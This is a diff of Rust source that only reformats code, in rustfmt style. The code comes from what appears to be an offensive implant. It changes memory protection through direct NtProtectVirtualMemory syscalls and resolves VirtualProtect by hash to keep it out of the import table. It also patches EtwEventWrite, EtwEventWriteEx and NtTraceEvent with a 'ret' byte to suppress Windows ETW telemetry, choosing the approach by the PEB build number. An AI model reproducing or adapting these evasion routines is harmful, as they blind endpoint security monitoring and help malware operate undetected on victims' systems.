@@ -68,11 +68,11 @@ mod imp {
             let mut base_addr = addr;
             let mut region_size = size;
             let status = crate::syscalls::syscall_NtProtectVirtualMemory(
-                (-1isize) as usize as u64,              // NtCurrentProcess()
-                &mut base_addr as *mut _ as usize as u64, // PVOID*  (in/out)
+                (-1isize) as usize as u64,                  // NtCurrentProcess()
+                &mut base_addr as *mut _ as usize as u64,   // PVOID*  (in/out)
                 &mut region_size as *mut _ as usize as u64, // PSIZE_T (in/out)
                 new_protect as u64,
-                old_protect as *mut _ as usize as u64,     // PULONG  (out)
+                old_protect as *mut _ as usize as u64, // PULONG  (out)
             );
             status == 0 // NTSTATUS_SUCCESS
         }
@@ -81,10 +81,10 @@ mod imp {
             // Resolve VirtualProtect from kernel32 at runtime to avoid IAT entry.
             use crate::pe_resolve_macros::hash_str_const;
             const HASH_VIRTUALPROTECT: u32 = hash_str_const(b"VirtualProtect\0");
-            type FnVirtualProtect = unsafe extern "system" fn(
-                *mut std::ffi::c_void, usize, u32, *mut u32,
-            ) -> i32;
-            let module = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
+            type FnVirtualProtect =
+                unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, *mut u32) -> i32;
+            let module = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
+            {
                 Some(m) => m,
                 None => return false,
             };
@@ -317,7 +317,11 @@ unsafe fn peb_build_number() -> Option<u32> {
     // PEB.OSBuildNumber is a USHORT at offset 0x120.
     let build = *(peb.add(0x120) as *const u16) as u32;
     // A build of 0 indicates the field was not populated (pre-Vista PEB layout).
-    if build == 0 { None } else { Some(build) }
+    if build == 0 {
+        None
+    } else {
+        Some(build)
+    }
 }
 
 /// Patch `EtwEventWrite`, `EtwEventWriteEx`, and `NtTraceEvent` according to
@@ -358,7 +362,11 @@ pub unsafe fn patch_etw_with_mode(mode: common::config::EtwPatchMode) -> anyhow:
                     );
                     return Ok(());
                 }
-                log::debug!("etw_patch: Windows build {} < {}; applying ETW patch", build, PATCHGUARD_ETW_BUILD_THRESHOLD);
+                log::debug!(
+                    "etw_patch: Windows build {} < {}; applying ETW patch",
+                    build,
+                    PATCHGUARD_ETW_BUILD_THRESHOLD
+                );
             } else {
                 // Could not read the PEB build number — proceed conservatively
                 // (apply the patch; this mirrors pre-check behaviour).
@@ -374,13 +382,17 @@ pub unsafe fn patch_etw_with_mode(mode: common::config::EtwPatchMode) -> anyhow:
     if patched {
         log::debug!("etw_patch: ETW functions patched successfully");
     } else {
-        return Err(anyhow::anyhow!("ETW patch verification failed: no functions were patched"));
+        return Err(anyhow::anyhow!(
+            "ETW patch verification failed: no functions were patched"
+        ));
     }
     Ok(())
 }
 
 #[cfg(not(windows))]
-pub unsafe fn patch_etw_with_mode(_mode: common::config::EtwPatchMode) -> anyhow::Result<()> { Ok(()) }
+pub unsafe fn patch_etw_with_mode(_mode: common::config::EtwPatchMode) -> anyhow::Result<()> {
+    Ok(())
+}
 
 /// Patch `EtwEventWrite`, `EtwEventWriteEx`, and `NtTraceEvent` in ntdll.dll
 /// by overwriting their first byte with `ret` (0xC3), suppressing ETW telemetry.
